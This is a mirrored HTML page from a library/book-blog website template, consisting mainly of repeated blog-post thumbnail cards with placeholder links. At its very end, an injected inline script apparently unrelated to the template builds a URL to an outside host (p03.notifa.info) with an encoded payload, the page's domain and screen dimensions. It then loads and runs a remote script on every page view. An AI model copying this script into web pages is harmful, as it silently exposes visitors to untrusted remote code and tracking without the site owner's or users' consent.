...
<!-- Mirrored from kodeforest.net/html/books/library/blog.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 05:11:24 GMT -->
<head>
<meta charset="utf-8">
            ...
            <div class="row">
                ...
                <div class="col-md-4 col-sm-6">
                    <div class="lib-blog-post">
                        <!--BLOG POST THUMB START-->
                        <div class="kode-thumb">
                            <img alt="" src="images/lib-blog6.png">
                            <div class="lib-btns">
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-search"></i></a>
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-picture-o"></i></a>
                            </div>
                        </div>
                        <!--BLOG POST THUMB END-->
                        <!--BLOG POST TEXT START-->
                        <div class="kode-text">
                            <h2>Young Adult Novel Reader.</h2>
                            <ul>
                                <li><p>by: <a href="#">James Greig</a></p></li>
                                <li><p><a href="#">20th August 2015</a></p></li>
                            </ul>
                            <a class="more" href="#"><i class="fa fa-chevron-right"></i></a>
                        </div>
                        <!--BLOG POST TEXT END-->
                    </div>
                </div>
                ...
                <div class="col-md-4 col-sm-6">
                    <div class="lib-blog-post">
                        <!--BLOG POST THUMB START-->
                        <div class="kode-thumb">
                            <img alt="" src="images/lib-blog7.png">
                            <div class="lib-btns">
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-search"></i></a>
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-picture-o"></i></a>
                            </div>
                ...
                <div class="col-md-4 col-sm-6">
                    <div class="lib-blog-post">
                        <!--BLOG POST THUMB START-->
                        <div class="kode-thumb">
                            <img alt="" src="images/lib-blog8.png">
                            <div class="lib-btns">
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-search"></i></a>
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-picture-o"></i></a>
                            </div>
                ...
                <div class="col-md-4 col-sm-6">
                    <div class="lib-blog-post">
                        <!--BLOG POST THUMB START-->
                        <div class="kode-thumb">
                            <img alt="" src="images/lib-blog9.png">
                            <div class="lib-btns">
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-search"></i></a>
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-picture-o"></i></a>
                            </div>
                ...
                <div class="col-md-4 col-sm-6">
                    <div class="lib-blog-post">
                        <!--BLOG POST THUMB START-->
                        <div class="kode-thumb">
                            <img alt="" src="images/lib-blog10.png">
                            <div class="lib-btns">
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-search"></i></a>
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-picture-o"></i></a>
                            </div>
                ...
                <div class="col-md-4 col-sm-6">
                    <div class="lib-blog-post">
                        <!--BLOG POST THUMB START-->
                        <div class="kode-thumb">
                            <img alt="" src="images/lib-blog11.png">
                            <div class="lib-btns">
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-search"></i></a>
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-picture-o"></i></a>
                            </div>
                ...
                <div class="col-md-4 col-sm-6">
                    <div class="lib-blog-post">
                        <!--BLOG POST THUMB START-->
                        <div class="kode-thumb">
                            <img alt="" src="images/lib-blog12.png">
                            <div class="lib-btns">
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-search"></i></a>
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-picture-o"></i></a>
                            </div>
                ...
                <div class="col-md-4 col-sm-6">
                    <div class="lib-blog-post">
                        <!--BLOG POST THUMB START-->
                        <div class="kode-thumb">
                            <img alt="" src="images/lib-blog3.png">
                            <div class="lib-btns">
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-search"></i></a>
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-picture-o"></i></a>
                            </div>
                ...
                <div class="col-md-4 visible-lg visible-md">
                    <div class="lib-blog-post">
                        <!--BLOG POST THUMB START-->
                        <div class="kode-thumb">
                            <img alt="" src="images/lib-blog4.png">
                            <div class="lib-btns">
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-search"></i></a>
                                <a title="" data-toggle="tooltip" href="#" data-original-title="Title"><i class="fa fa-picture-o"></i></a>
                            </div>
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdy8hzAW7EupXbafgU%2fGsFAP2920cERsYTUtEnhh066k%2b%2bMV3yvmI9rvhBKTQSsDNbMFnCeY58bpL47PZ%2bCQSFBsmmkB5x5QGmohakyf%2bHxZ9aL5rwX%2ft2d4LBKzTKB5Hi9SwNhcX6t9tu36QhgwVlILyRPEkbm4nrYlJCRKtKsgCIAnq2DbsJlI1pCydt2AoXHbJMftb%2fF7a1mofC8beLzridMC%2but7j2jewMv4pLJxfx8nTrUyrQT%2blMJqrGGj7gkkF9XsmCy%2bU2PyKAk63M3ebkStytf%2f27j1BeGzr00cCkwPPs9W%2foHX1Wg%2bYw3PcfnlN%2bHDUCZONwCXp6xtbsRrmApT4CwJcluFvhxEgGfYYOikYUTMrbN%2fjtC7U6oUJ9x6sH5KyDePqJmv%2fA0EWhoGnD%2b6Hfuj5eYeLIVw88JaEpXrUruSdRxjlT6Qxn0P47Lglb7VWTbpC4GQZjWyzl21CtEOGV81fZtUbYLI9Ahh4%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from kodeforest.net/html/books/library/blog.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 Dec 2018 05:12:18 GMT -->
</html>